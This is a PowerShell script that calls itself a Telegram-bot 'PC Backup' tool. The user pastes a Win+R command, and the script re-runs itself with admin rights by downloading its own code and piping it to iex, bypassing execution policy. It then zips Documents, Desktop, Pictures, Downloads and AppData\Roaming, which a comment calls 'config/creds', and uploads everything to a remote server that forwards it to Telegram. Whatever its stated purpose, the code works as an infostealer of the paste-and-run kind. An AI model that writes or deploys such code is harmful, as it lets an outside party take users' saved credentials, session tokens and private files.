# backup.ps1 - PC data backup to Telegram via server
# Run from the bot button "PC Backup command" (Win+R -> paste -> Enter). The link is short-lived;
# the server fills in __BASE__, __SELF__ and the token below - you never type or store a token.

$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ProgressPreference = 'SilentlyContinue'

$Base  = '__BASE__'
$Self  = '__SELF__'
$Token = '__TOKEN__'

# --- Self-elevate if not admin (re-runs the same short-lived link) ---
$id      = [Security.Principal.WindowsIdentity]::GetCurrent()
$isAdmin = (New-Object Security.Principal.WindowsPrincipal $id).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    # no -NonInteractive: the final "Press Enter" needs an interactive window
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm '$Self' | iex`""
    exit
}

[Console]::OutputEncoding = [Text.Encoding]::UTF8
$env:PYTHONUTF8 = '1'

$Host.UI.RawUI.WindowTitle = 'PC Backup - running...'

function Log($msg) { Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $msg" }
function Send-Backup($ZipPath, $Name) {
    $bytes   = [IO.File]::ReadAllBytes($ZipPath)
    $headers = @{ Authorization = "Bearer $Token" }
    $uri     = "$Base/hapi/backup/$Name"
    Log "Uploading $Name ($([math]::Round($bytes.Length/1MB,1)) MB) to server..."
    try {
        $r = Invoke-WebRequest -Uri $uri -Method POST -Body $bytes `
             -Headers $headers -ContentType 'application/gzip' -UseBasicParsing
        Log "Upload OK: $Name -> $($r.StatusCode)"
        return $true
    } catch {
        Log "Upload FAILED for $Name : $_"
        return $false
    }
}

$Tmp  = Join-Path $env:TEMP "pc_backup_$(Get-Random)"
New-Item -ItemType Directory -Force $Tmp | Out-Null

# Folders to back up: Documents, Desktop, Pictures, Downloads, AppData\Roaming (config/creds)
$HostName = $env:COMPUTERNAME -replace '[^a-zA-Z0-9_-]', '_'
$Stamp    = Get-Date -Format 'yyyyMMdd_HHmmss'

$Targets = @(
    @{ name = "$HostName-Documents-$Stamp"; path = [Environment]::GetFolderPath('MyDocuments') },
    @{ name = "$HostName-Desktop-$Stamp";   path = [Environment]::GetFolderPath('Desktop') },
    @{ name = "$HostName-Pictures-$Stamp";  path = [Environment]::GetFolderPath('MyPictures') },
    @{ name = "$HostName-Downloads-$Stamp"; path = (Join-Path $env:USERPROFILE 'Downloads') },
    @{ name = "$HostName-AppData-$Stamp";   path = $env:APPDATA }
)

$ok = 0; $fail = 0

foreach ($t in $Targets) {
    $src = $t.path
    if (-not (Test-Path $src)) { Log "Skipping (not found): $src"; continue }

    $zipFile = Join-Path $Tmp "$($t.name).zip"
    Log "Zipping: $src -> $zipFile"
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [IO.Compression.ZipFile]::CreateFromDirectory($src, $zipFile, 'Optimal', $false)
    } catch {
        Log "Zip failed for $src : $_"
        $fail++
        continue
    }

    $sizeMB = [math]::Round((Get-Item $zipFile).Length / 1MB, 1)
    Log "Zip done: $sizeMB MB"

    # If zip > 190 MB split it into parts so it fits server's BACKUP_MAX_MB
    $maxBytes = 190 * 1024 * 1024
    $zipSize  = (Get-Item $zipFile).Length

    if ($zipSize -le $maxBytes) {
        if (Send-Backup $zipFile $t.name) { $ok++ } else { $fail++ }
    } else {
        Log "File too large ($sizeMB MB) - splitting into parts..."
        $bytes   = [IO.File]::ReadAllBytes($zipFile)
        $parts   = [math]::Ceiling($bytes.Length / $maxBytes)
        for ($i = 0; $i -lt $parts; $i++) {
            $start   = $i * $maxBytes
            $len     = [math]::Min($maxBytes, $bytes.Length - $start)
            $chunk   = [byte[]]::new($len)
            [Array]::Copy($bytes, $start, $chunk, 0, $len)
            $partFile = Join-Path $Tmp "$($t.name)-part$($i+1).bin"
            [IO.File]::WriteAllBytes($partFile, $chunk)
            $partName = "$($t.name)-part$($i+1)of$parts"
            if (Send-Backup $partFile $partName) { $ok++ } else { $fail++ }
            Remove-Item $partFile -Force -ErrorAction SilentlyContinue
        }
    }

    Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
}

# Clean up temp dir
Remove-Item $Tmp -Recurse -Force -ErrorAction SilentlyContinue

Log ""
Log "===== BACKUP COMPLETE: $ok succeeded, $fail failed ====="
Log "Check your Telegram backup group for the files."
Log ""

$Host.UI.RawUI.WindowTitle = "PC Backup - DONE ($ok ok, $fail failed)"
Read-Host 'Press Enter to close'
